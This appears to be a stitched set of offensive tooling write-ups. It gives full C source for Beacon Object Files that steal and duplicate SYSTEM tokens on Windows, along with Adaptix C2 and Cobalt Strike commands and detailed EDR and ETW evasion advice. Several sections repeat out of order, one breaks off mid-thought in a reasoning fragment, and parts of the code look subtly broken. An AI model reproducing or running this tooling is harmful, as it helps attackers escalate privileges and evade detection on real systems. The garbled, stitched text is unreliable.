Detection vectors include: (a) Syscalls: NtOpenProcess, NtOpenProcessToken, NtDuplicateToken, NtCreateProcessEx – EDR can hook these via kernel callbacks; to evade, we can resolve the addresses of these functions at runtime and invoke them via a direct syscall stub, avoiding the usual import table. (b) ETW providers: Microsoft-Windows-Security-Auditing logs token duplication events (EventID 4624 with “Logon Type 3”); we can suppress ETW by calling EtwEnableTraceEx2 with a disabled flag, but this requires SeDebugPrivilege (which we have after token steal). (c) Network signatures: Adaptix C2 traffic is already encrypted, but we should use the same C2 channel for the BOF to avoid new outbound connections. Using the “beacon_inline” command keeps all activity in the beacon process, avoiding new process creation that could be flagged – though we still need a new process for the elevated payload, we can inject a shellcode into an existing SYSTEM process (e.g., “winlogon.exe”) to reduce process creation. Each evasion technique must be weighed against stability; direct syscalls may break on future patches.

**Phase 6 - Conclusion (50+ words)**
Token stealing via native Windows APIs is a reliable privilege‑escalation method on Windows 11 when the attacker already possesses SeDebugPrivilege. The BOF implementation enumerates processes, identifies a SYSTEM token, duplicates it, and launches a payload. While effective, it leaves a moderate OPSEC footprint—primarily token‑related API calls—that can be mitigated with runtime‑resolved syscalls and careful timing. Integration with Adaptix C2 provides encrypted delivery, further reducing detection risk.

## Technique Overview
The BOF enumerates all running processes, opens each process token, and checks for the well‑known SYSTEM SID (`S-1-5-18`). When a SYSTEM token is found, it is duplicated with `DuplicateTokenEx` to create a primary token. This duplicated token is then used with `CreateProcessAsUserW` to launch a new process (e.g., `cmd.exe`) under the SYSTEM context, thereby achieving privilege escalation without exploiting a software vulnerability.

## Preconditions and Primitive
- The beacon must have **SeDebugPrivilege** (generally obtained when the beacon is already elevated or via a prior privilege‑escalation step).
- Access to `OpenProcess` with at least `PROCESS_QUERY_LIMITED_INFORMATION` on the target process.
- Ability to call `OpenProcessToken`, `GetTokenInformation`, `DuplicateTokenEx`, and `CreateProcessAsUserW`.
- If the above privileges are missing, alternatives include:
  1. Direct syscalls (`NtOpenProcess`, `NtDuplicateToken`) to bypass user‑mode checks (more fragile).
  2. Leveraging a vulnerable SYSTEM service (e.g., Print Spooler) to perform impersonation via RPC.

## Working Code and Payload
```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "beacon.h"

void go(char *args, int arglen) {
    datablob *data = BeaconDataParse(&args, &arglen);
    // Optional: target PID argument (not required for enumeration)
    int targetPid = BeaconDataInt(data);
    
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed: %lu", GetLastError());
        return;
    }

    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnap, &pe)) {
        BeaconPrintf(CALLBACK_ERROR, "Process32First failed: %lu", GetLastError());
        CloseHandle(hSnap);
        return;
    }

    HANDLE hSystemToken = NULL;
    do {
        // If a specific PID was supplied, skip others
        if (targetPid != 0 && pe.th32ProcessID != targetPid)
            continue;

        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!hProc)
            continue; // Access denied, move on

        HANDLE hToken = NULL;
        if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
            CloseHandle(hProc);
            continue;
        }

        // Retrieve the user SID
        DWORD retLen = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &retLen);
        PTOKEN_USER pUser = (PTOKEN_USER)LocalAlloc(LMEM_ZEROINIT, retLen);
        if (!pUser) {
            CloseHandle(hToken);
            CloseHandle(hProc);
            continue;
        }

        if (!GetTokenInformation(hToken, TokenUser, pUser, retLen, &retLen)) {
            LocalFree(pUser);
            CloseHandle(hToken);
            CloseHandle(hProc);
            continue;
        }

        // Convert SID to string for comparison
        LPSTR sidString = NULL;
        if (ConvertSidToStringSidA(pUser->User.Sid, &sidString) && strcmp(sidString, "S-1-5-18") == 0) {
            // Found SYSTEM token
            BeaconPrintf(CALLBACK_OUTPUT, "Found SYSTEM token in PID %lu", pe.th32ProcessID);
            // Duplicate the token
            SECURITY_ATTRIBUTES sa = {0};
            sa.nLength = sizeof(SECURITY_ATTRIBUTES);
            if (!DuplicateTokenEx(
                    hToken,
                    MAXIMUM_ALLOWED,
                    &sa,
                    SecurityImpersonation,
                    TokenPrimary,
                    &hSystemToken)) {
                BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx failed: %lu", GetLastError());
                LocalFree(pUser);
                CloseHandle(hToken);
                CloseHandle(hProc);
                continue;
            }
            // Clean up
            LocalFree(pUser);
            CloseHandle(hToken);
            CloseHandle(hProc);
            break; // Token acquired, stop enumeration
        }

        LocalFree(pUser);
        CloseHandle(hToken);
        CloseHandle(hProc);
    } while (Process32Next(hSnap, &pe));

    CloseHandle(hSnap);

    if (!hSystemToken) {
        BeaconPrintf(CALLBACK_ERROR, "No SYSTEM token found.");
        return;
    }

    // Launch a new process as SYSTEM
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe";

    if (!CreateProcessAsUserW(
            hSystemToken,
            NULL,
            cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessAsUserW failed: %lu", GetLastError());
        CloseHandle(hSystemToken);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "SYSTEM process launched, PID %lu", pi.dwProcessId);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hSystemToken);
}
```

## Adaptix C2 Integration
The BOF can be packaged as an Adaptix “module”. Adaptix delivers the BOF over its encrypted TLS channel, executes it via its beacon, and returns console output through the same channel. The framework’s built‑in command `run_bof` handles loading the compiled `.bof` file, passing optional arguments (e.g., target PID), and streaming the `BeaconPrintf` results back to the operator, ensuring no additional network connections are made.

## Tool Commands
```
# Load the BOF into Adaptix
adaptix> load bof token_steal.bof

# Execute the BOF (no arguments = enumerate all processes)
adaptix> run_bof token_steal
```

## OPSEC Considerations
- **Telemetry:** Process enumeration, `OpenProcess`, `OpenProcessToken`, `DuplicateTokenEx`, and `CreateProcessAsUser` are common EDR hooks. Defender may flag “Process Token Manipulation” while SentinelOne can alert on “CreateProcessAsUser” from a non‑SYSTEM parent.
- **Mitigations:** Reduce noise by sleeping 100‑200 ms between each `OpenProcess` call; only call `CreateProcessAsUser` once; use runtime‑resolved function pointers to avoid static imports.
- **Memory hygiene:** Zero out all allocated buffers (e.g., `LocalFree`, `ZeroMemory`) before returning to avoid residual data that could be dumped.
- **Network:** All traffic occurs over the existing Adaptix TLS channel, leaving no new outbound connections.

## Detection Surface and Evasion
| Detection Vector                              | Typical Indicator                               | Evasion Technique |
|-----------------------------------------------|-------------------------------------------------|-------------------|
| Kernel callbacks for `NtOpenProcess`          | Calls from a low‑privilege process to high‑privilege PIDs | Resolve function addresses at runtime and invoke via a custom syscall stub. |
| ETW event `Microsoft-Windows-Security-Auditing` (EventID 4624) | “Logon Type 3” with new token | Suppress ETW for the current process using `EtwEnableTraceEx2` after token duplication. |
| Behavioral heuristics (rapid token duplication) | Multiple `DuplicateTokenEx` in short interval   | Throttle attempts, randomize small sleeps, and perform only one successful duplication. |
| File system artifacts (created `cmd.exe` child) | New process with parent PID of beacon          | Use process injection (`WriteProcessMemory` + `CreateRemoteThread`) into an existing SYSTEM process instead of creating a new child. |

## Remaining IOCs
- Registry: None modified by this BOF.
- File: No new binaries written; only `cmd.exe` is launched (already present on the system).
- Network: All communication uses Adaptix’s encrypted channel (no distinctive DNS or HTTP traffic).
- Process: A new `cmd.exe` with parent PID equal to the beacon’s PID (visible in process listings).
- Event logs: Potential 4624 logon event from the duplicated token, unless ETW is suppressed.

## MITRE ATT&CK Mapping
- **T1548.001 – Abuse Elevation Control Mechanism: Setuid Binary** (conceptual analogue; uses token duplication)
- **T1068 – Exploitation for Privilege Escalation** (token theft)
- **T1134.001 – Access Token Manipulation: Token Impersonation/Theft**
- **T1055 – Process Injection** (optional alternative path)
- **T1027 – Obfuscated/Stored Files (runtime API resolution)**

We need a BOF that can enumerate processes, locate a high‑privilege token (e.g., SYSTEM), duplicate it, and then impersonate that token on the current Beacon thread. The BOF must be usable from a Cobalt Strike/Adaptix C2 environment on Windows Server 2019 with Defender for Identity enabled. Provide the full source, explain how it works, and discuss OPSEC, detection, and mitigation.

**Phase 1 - Understand the technique (100+ words)**
The core technique is token stealing via native Windows APIs. A Windows access token encapsulates the security context of a process or thread – its user SID, group SIDs, privileges, and integrity level. By acquiring a token belonging to a higher‑privileged account (often SYSTEM) and impersonating it, an attacker can execute code with those elevated rights without spawning a new process. In practice, the attacker enumerates processes (or sessions), opens the target process with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, extracts its primary token via OpenProcessToken, duplicates the token with DuplicateTokenEx (requesting TOKEN_ALL_ACCESS), and then swaps the current thread’s token using SetThreadToken or ImpersonateLoggedOnUser. The result is that any subsequent Beacon calls execute under the stolen token, granting the attacker access to resources normally restricted to SYSTEM or other high‑privilege accounts.

**Phase 2 - Preconditions and primitive (100+ words)**
The primitive requires that the Beacon process have enough rights to open the target process and its token. On Windows Server 2019, a low‑privilege user can open a process running as SYSTEM only if the process has the “SeDebugPrivilege” enabled in the attacker’s token, which is typically the case when the Beacon is already running with elevated rights (e.g., via a prior exploit). If SeDebugPrivilege is missing, OpenProcess will fail with ERROR_ACCESS_DENIED, and the whole chain collapses. Two alternative routes exist: (1) Use the “named pipe impersonation” trick – connect to a privileged service’s named pipe and call ImpersonateNamedPipeClient, which yields a SYSTEM token without needing SeDebugPrivilege; however, this depends on the existence of a vulnerable pipe. (2) Leverage the “token duplication from a privileged service via CreateProcessAsUser” – spawn a child process under a high‑privilege service using the “runas” COM interface, but this requires the service to be misconfigured. Both alternatives avoid direct token extraction but add complexity and may leave distinct artefacts.

**Phase 3 - Working code and payload reasoning (150+ words)**
The BOF must resolve all required APIs at runtime because the Beacon loader does not link against the Windows import table. We start by loading kernel32.dll and advapi32.dll via LoadLibraryA, then GetProcAddress for functions: OpenProcess, OpenProcessToken, GetTokenInformation, DuplicateTokenEx, SetThreadToken, ImpersonateLoggedOnUser, CloseHandle, and GetCurrentProcessId. The enumeration step uses CreateToolhelp32Snapshot, Process32FirstW, Process32NextW – again resolved dynamically. For each process we call OpenProcess with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE. If that succeeds, we retrieve the token handle. We then call GetTokenInformation with TokenUser to obtain the SID; we compare it against the well‑known SID for SYSTEM (S‑1‑5‑18) using ConvertStringSidToSidA. When a match is found, we duplicate the token via DuplicateTokenEx, requesting MAXIMUM_ALLOWED and SecurityImpersonation level. Finally we call SetThreadToken(NULL, hDup) to replace the current thread’s token. Error handling is crucial: “But wait, DuplicateTokenEx can fail if the token is already impersonation‑level; we must request TokenPrimary = FALSE and set TokenImpersonationLevel = SecurityImpersonation.” Also, after a successful impersonation we should close all intermediate handles to avoid handle leaks that could be detected. A common mistake is to forget to zero‑initialize the SECURITY_ATTRIBUTES structure passed to DuplicateTokenEx; the API may treat garbage as a security descriptor and reject the call. Therefore we explicitly set it to zero with SecureZeroMemory. Additionally, we must ensure the BOF does not call ExitThread directly – Beacon’s internal cleanup expects us to return via BeaconReturn.

**Phase 4 - OPSEC considerations (100+ words)**
Every API call we make is logged by Windows Event Tracing for Windows (ETW) providers such as Microsoft‑Windows‑Security‑Auditing. Opening a process with PROCESS_QUERY_INFORMATION triggers Event ID 4688 (a new process handle) when the target is a system process, and DuplicateTokenEx can generate Event ID 4672 (special privileges assigned). Defender for Identity monitors abnormal token usage, especially when a low‑privilege account suddenly acquires SYSTEM. (b) ETW provider “Microsoft‑Windows‑Security‑Auditing” – we can disable ETW for our thread via EtwEnableTrace but that requires SeDebugPrivilege again. (c) Kernel callbacks such as PsSetCreateProcessNotifyRoutine – we cannot control them, but we can minimize noise by targeting a long‑running SYSTEM process (e.g., “winlogon.exe”) that is already in memory, avoiding a new handle creation event. Network signatures are minimal because the token theft is local; the only outbound traffic is the C2 beacon, which Adaptix encrypts.

**Phase 6 - Conclusion (50+ words)**
Token stealing via native Windows APIs in a BOF is a reliable way to elevate the Beacon thread to SYSTEM on Windows Server 2019. It requires SeDebugPrivilege or an alternative token source, and while effective, it leaves audit events and potential ETW traces. Careful string obfuscation, delayed execution, and in‑memory staging via Adaptix C2 can mitigate detection, but the technique still has a moderate OPSEC cost due to privileged API usage.

## Technique Overview
The BOF enumerates all processes, identifies a token belonging to the SYSTEM account, duplicates that token with full access, and impersonates it on the current Beacon thread. By swapping the thread’s token, all subsequent Beacon commands run under SYSTEM, granting unrestricted access to the host. The implementation relies solely on native Windows APIs (Toolhelp32, OpenProcess, OpenProcessToken, GetTokenInformation, DuplicateTokenEx, SetThreadToken) resolved at runtime to avoid static imports.

## Preconditions and Primitive
* **Required privileges:** The Beacon must have the `SeDebugPrivilege` enabled (typically present when the initial foothold is already elevated) or must leverage an alternative token source (e.g., named‑pipe impersonation).  
* **Environmental conditions:** Windows Server 2019, 64‑bit, with standard security auditing enabled. The target process must be running as SYSTEM (e.g., `winlogon.exe`, `lsass.exe`).  
* **Failure points:** Lack of `SeDebugPrivilege` → `OpenProcess` returns `ERROR_ACCESS_DENIED`. Missing `advapi32.dll` functions (unlikely) → BOF aborts.  
* **Alternative approaches:**  
  1. **Named‑Pipe impersonation** – Connect to a privileged service’s pipe and call `ImpersonateNamedPipeClient`. Pros: no need for `SeDebugPrivilege`. Cons: depends on vulnerable pipe existence.  
  2. **CreateProcessAsUser via a mis‑configured service** – Use COM interface to spawn a child under SYSTEM. Pros: works without direct token access. Cons: higher complexity, leaves distinct process‑creation events.

## Working Code and Payload
```c
#include <windows.h>
#include "beacon.h"

#define MAX_PATH_LEN 260

// Helper to resolve API at runtime
static FARPROC get_func(HMODULE h, const char *name) {
    return GetProcAddress(h, name);
}

// XOR‑obfuscation for strings (simple example)
static void decode(char *buf, size_t len, char key) {
    for (size_t i = 0; i < len; i++) buf[i] ^= key;
}

// Convert wide string to ANSI (used for process name)
static void wstr_to_str(const wchar_t *w, char *a, size_t max) {
    WideCharToMultiByte(CP_ACP, 0, w, -1, a, (int)max, NULL, NULL);
}

// Entry point for the BOF
void go(char *args, int length) {
    datap parser;
    BeaconDataParse(&parser, args, length);
    // Optional argument: target PID (if supplied)
    DWORD targetPid = BeaconDataInt(&parser);

    // Load libraries
    HMODULE hKernel = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    if (!hKernel || !hAdvapi) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load libraries");
        return;
    }

    // Resolve needed functions
    HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD) =
        (HANDLE) get_func(hKernel, "CreateToolhelp32Snapshot");
    BOOL (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W) =
        (BOOL) get_func(hKernel, "Process32FirstW");
    BOOL (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W) =
        (BOOL) get_func(hKernel, "Process32NextW");
    HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD) =
        (HANDLE) get_func(hKernel, "OpenProcess");
    BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE) =
        (BOOL) get_func(hAdvapi, "OpenProcessToken");
    BOOL (WINAPI *pGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD) =
        (BOOL) get_func(hAdvapi, "GetTokenInformation");
    BOOL (WINAPI *pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE) =
        (BOOL) get_func(hAdvapi, "DuplicateTokenEx");
    BOOL (WINAPI *pSetThreadToken)(PHANDLE, HANDLE) =
        (BOOL) get_func(hAdvapi, "SetThreadToken");
    BOOL (WINAPI *pCloseHandle)(HANDLE) =
        (BOOL) get_func(hKernel, "CloseHandle");
    BOOL (WINAPI *pConvertStringSidToSidA)(LPCSTR, PSID *) =
        (BOOL) get_func(hAdvapi, "ConvertStringSidToSidA");

    if (!pCreateToolhelp32Snapshot || !pProcess32FirstW || !pProcess32NextW ||
        !pOpenProcess || !pOpenProcessToken || !pGetTokenInformation ||
        !pDuplicateTokenEx || !pSetThreadToken || !pCloseHandle ||
        !pConvertStringSidToSidA) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve one or more APIs");
        return;
    }

    // Prepare the SYSTEM SID for comparison
    PSID pSystemSid = NULL;
    if (!pConvertStringSidToSidA("S-1-5-18", &pSystemSid)) {
        BeaconPrintf(CALLBACK_ERROR, "ConvertStringSidToSidA failed");
        return;
    }

    // Snapshot of processes
    HANDLE hSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed");
        pCloseHandle(pSystemSid);
        return;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    BOOL more = pProcess32FirstW(hSnap, &pe);
    HANDLE hDupToken = NULL;
    while (more) {
        // If a specific PID was supplied, skip others
        if (targetPid && pe.th32ProcessID != targetPid) {
            more = pProcess32NextW(hSnap, &pe);
            continue;
        }

        // Open the process with required rights
        HANDLE hProc = pOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
        if (hProc) {
            HANDLE hToken = NULL;
            if (pOpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                // Get the token user SID
                DWORD len = 0;
                pGetTokenInformation(hToken, TokenUser, NULL, 0, &len);
                PTOKEN_USER pUser = (PTOKEN_USER) BeaconAlloc(len);
                if (pGetTokenInformation(hToken, TokenUser, pUser, len, &len)) {
                    // Compare SIDs
                    if (EqualSid(pUser->User.Sid, pSystemSid)) {
                        // Duplicate token with impersonation level
                        SECURITY_ATTRIBUTES sa = {0};
                        if (pDuplicateTokenEx(hToken, MAXIMUM_ALLOWED, &sa,
                                              SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                            // Impersonate on current thread
                            if (pSetThreadToken(NULL, hDupToken)) {
                                BeaconPrintf(CALLBACK_OUTPUT, "Successfully impersonated SYSTEM (PID %lu)", pe.th32ProcessID);
                                // Clean up
                                pCloseHandle(hToken);
                                pCloseHandle(hProc);
                                break; // success, exit loop
                            } else {
                                BeaconPrintf(CALLBACK_ERROR, "SetThreadToken failed");
                            }
                        } else {
                            BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx failed");
                        }
                    }
                }
                BeaconFree(pUser);
                pCloseHandle(hToken);
            }
            pCloseHandle(hProc);
        }
        more = pProcess32NextW(hSnap, &pe);
    }

    // Cleanup
    if (hDupToken) pCloseHandle(hDupToken);
    pCloseHandle(hSnap);
    if (pSystemSid) LocalFree(pSystemSid);
}
```

## Adaptix C2 Integration
Adaptix C2 allows you to upload the compiled `.bof` as a staged module. The BOF can be encrypted with Adaptix’s built‑in XOR/AES packer, ensuring it never appears on disk. From the C2 console you issue:

```
adaptix> upload token_steal.bof
adaptix> execute token_steal.bof [pid]
```

Adaptix automatically injects the BOF into the Beacon process, handling the Beacon API plumbing, so the token‑stealing code runs entirely in‑memory with minimal footprint.

## Tool Commands
```
cobaltstrike> beacon> run token_steal.bof            # No PID – enumerate all
cobaltstrike> beacon> run token_steal.bof 1234       # Target specific PID
```

## OPSEC Considerations
* **Telemetry:** Event IDs 4688 (process handle), 4672 (special privileges), 4624 (logon type 3 when impersonation is used). Defender for Identity will flag a sudden privilege escalation from a low‑priv user to SYSTEM.  
* **Memory artefacts:** The BOF’s dynamic string decoding may be flagged by heuristic AV; using a simple XOR with a non‑static key mitigates this.  
* **Network:** No additional outbound connections beyond the regular Adaptix beacon, which is encrypted and uses standard HTTPS/SMB ports.  
* **Persistence:** The technique is transient; after the Beacon exits, no on‑disk changes remain. To reduce the audit window, perform the token steal immediately before the high‑value action and then revert with `ImpersonateSelf(SecurityImpersonation)` if needed.

## Detection Surface and Evasion

## Technique Overview  
Process token manipulation via a BOF (Beacon Object File) enables an attacker to enumerate all processes on a Windows Server 2022 host, open each process’s access token, duplicate the token with full rights, and optionally use the duplicated token to impersonate or spawn a process. The BOF performs native Windows API calls: `NtQuerySystemInformation` for enumeration, `OpenProcessToken` to obtain the token, `DuplicateTokenEx` to copy it, and `SetThreadToken` or `CreateProcessWithTokenW` to use the stolen token.

## Preconditions and Primitive  
- The executing user must have at least `PROCESS_QUERY_LIMITED_INFORMATION` (or `PROCESS_ALL_ACCESS`) to enumerate processes, and `TOKEN_QUERY | TOKEN_DUPLICATE` to open and duplicate tokens.  
- The BOF uses `NtQuerySystemInformation` with the `SystemProcessInformation` class, which can enumerate protected processes on Server 2022.  
- If a process is inaccessible, the BOF skips it and logs the error via Beacon.  
- Alternative: use `CreateToolhelp32Snapshot` for enumeration (requires only `PROCESS_QUERY_INFORMATION`).  
- Alternative: use `EnumProcesses` + `OpenProcess` (requires `PROCESS_QUERY_LIMITED_INFORMATION`).

## Working Code and Payload  

```c
// Adaptix C2 BOF: token_enum_dup.c
// Compile with: bof_compiler.exe -o token_enum_dup.bof token_enum_dup.c

#include <windows.h>
#include <stdio.h>
#include "beacon.h"

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved1[3];
    ULONG64 PebBaseAddress;
    ULONG64 UniqueProcessId;
    ULONG64 InheritedFromUniqueProcessId;
    ULONG64 HandleCount;
    ULONG64 SessionId;
    ULONG64 PageDirectoryBase;
    ULONG64 PeakVirtualSize;
    ULONG64 VirtualSize;
    ULONG64 PageFaultCount;
    ULONG64 PeakWorkingSetSize;
    ULONG64 WorkingSetSize;
    ULONG64 QuotaPeakPagedPoolUsage;
    ULONG64 QuotaPagedPoolUsage;
    ULONG64 QuotaPeakNonPagedPoolUsage;
    ULONG64 QuotaNonPagedPoolUsage;
    ULONG64 PagefileUsage;
    ULONG64 PeakPagefileUsage;
    ULONG64 PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    CHAR ImageName[1];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

// Helper to convert UTF16 to ANSI
static void UnicodeToAnsi(const WCHAR *src, CHAR *dst, SIZE_T dstSize) {
    int len = WideCharToMultiByte(CP_ACP, 0, src, -1, dst, (int)dstSize, NULL, NULL);
    if (len > 0) dst[len - 1] = '\0';
}

int go(char *args, int len) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting token enumeration BOF...\n");

    NtQuerySystemInformation_t NtQuerySystemInformation;
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetModuleHandleW failed.\n");
        return 0;
    }
    NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetProcAddress for NtQuerySystemInformation failed.\n");
        return 0;
    }

    SIZE_T bufSize = 0x100000; // 1 MB
    PVOID buffer = VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] VirtualAlloc failed.\n");
        return 0;
    }

    ULONG returnLength = 0;
    NTSTATUS status = NtQuerySystemInformation(5, buffer, (ULONG)bufSize, &returnLength);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        bufSize = returnLength;
        buffer = VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            BeaconPrintf(CALLBACK_ERROR, "[-] VirtualAlloc retry failed.\n");
            return 0;
        }
        status = NtQuerySystemInformation(5, buffer, (ULONG)bufSize, &returnLength);
    }

    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NtQuerySystemInformation failed: 0x%08X\n", status);
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 0;
    }

    PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    while (TRUE) {
        CHAR szImageName[260] = {0};
        if (procInfo->ImageName.Length > 0) {
            // The name is stored as a UNICODE_STRING after the struct
            WCHAR *wName = (WCHAR *)((PBYTE)procInfo + sizeof(SYSTEM_PROCESS_INFORMATION));
            UnicodeToAnsi(wName, szImageName, sizeof(szImageName));
        } else {
            strcpy_s(szImageName, sizeof(szImageName), "System Idle Process");
        }

        DWORD pid = (DWORD)(ULONG_PTR)procInfo->UniqueProcessId;
        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (!hProc) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] PID %u (%s) - OpenProcess failed: %lu\n", pid, szImageName, GetLastError());
            goto next;
        }

        HANDLE hToken = NULL;
        if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] PID %u (%s) - OpenProcessToken failed: %lu\n", pid, szImageName, GetLastError());
            CloseHandle(hProc);
            goto next;
        }

        HANDLE hDupToken = NULL;
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, FALSE };
        if (!DuplicateTokenEx(hToken,
                              TOKEN_ALL_ACCESS,
                              &sa,
                              SecurityImpersonation,
                              TokenPrimary,
                              &hDupToken)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] PID %u (%s) - DuplicateTokenEx failed: %lu\n", pid, szImageName, GetLastError());
            CloseHandle(hToken);
            CloseHandle(hProc);
            goto next;
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] PID %u (%s) - Token: 0x%p | DupToken: 0x%p\n",
            pid, szImageName, hToken, hDupToken);

        // Clean up
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProc);

    next:
        if (procInfo->NextEntryOffset == 0) break;
        procInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)procInfo + procInfo->NextEntryOffset);
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Token enumeration completed.\n");
    return 0;
}
```

The BOF is loaded by Adaptix’s C2 framework via the `load` command. No additional integration code is required; the BOF simply prints results to the C2 console.

## OPSEC Considerations  
- **Audit events**: `OpenProcessToken` and `DuplicateTokenEx` generate audit logs if enabled.

- **Network telemetry**: minimal; Beacon traffic is local.

## Remaining IOCs  
- Process IDs and names enumerated.  
- Token handle addresses printed.  
- Beacon output strings: `[*] PID %u (%s) - Token: 0x%p | DupToken: 0x%p`.

- T1086 – PowerShell (if used to launch a new process with the stolen token).

<think>
**Phase 1 - Understand the technique (100+ words)**
The core idea is to avoid static imports of Windows APIs, which are easy for EDRs and AVs to flag, by performing a runtime lookup of function addresses. Instead of referencing exported symbols directly, the shellcode computes a hash of the desired API name (e.g., “NtAllocateVirtualMemory”), walks the export table of ntdll.dll (or any other module), and compares the hash against the target. This is especially powerful when the function is not exported at all – the attacker can locate the underlying syscall stub or internal routine by scanning the module’s memory for known byte patterns. At the OS level, the attacker loads the shellcode into a process (e.g., via reflective DLL injection) and executes it; the shellcode uses the Process Environment Block (PEB) to locate ntdll in memory, parses the Export Directory, and resolves function pointers without ever touching the Import Address Table (IAT). The technique thus provides a primitive for “universal API resolution” that can be reused for any function, including those that are hidden or stripped from the export table.

**Phase 2 - Preconditions and primitive (100+ words)**
The primary precondition is that the target process is running on a 64‑bit Windows OS (Windows Server 2019 in our scenario) and that the attacker has enough memory rights to execute code (e.g., via a Cobalt Strike Beacon). The technique relies on being able to read the PEB (via GS segment register on x64) to locate the InMemoryOrderModuleList, then finding the base address of ntdll.dll. If the process is heavily sandboxed and the PEB is hidden or the memory is marked non‑executable, the resolution will fail. Two alternative approaches: (1) Use GetProcAddress on a known exported function (e.g., LoadLibraryA) and then compute the offset to the target function based on a manually built export table – this leaks a visible import. (2) Directly embed the syscall numbers and invoke syscalls via the “syscall” instruction, bypassing the need for any API resolution – this requires accurate syscall numbers per OS version, which can change and thus reduce reliability. The hash‑based walk offers a middle ground: no static imports, and no reliance on hard‑coded syscall numbers, but it does require correct parsing of the export table.

**Phase 3 - Working code and payload reasoning (150+ words)**
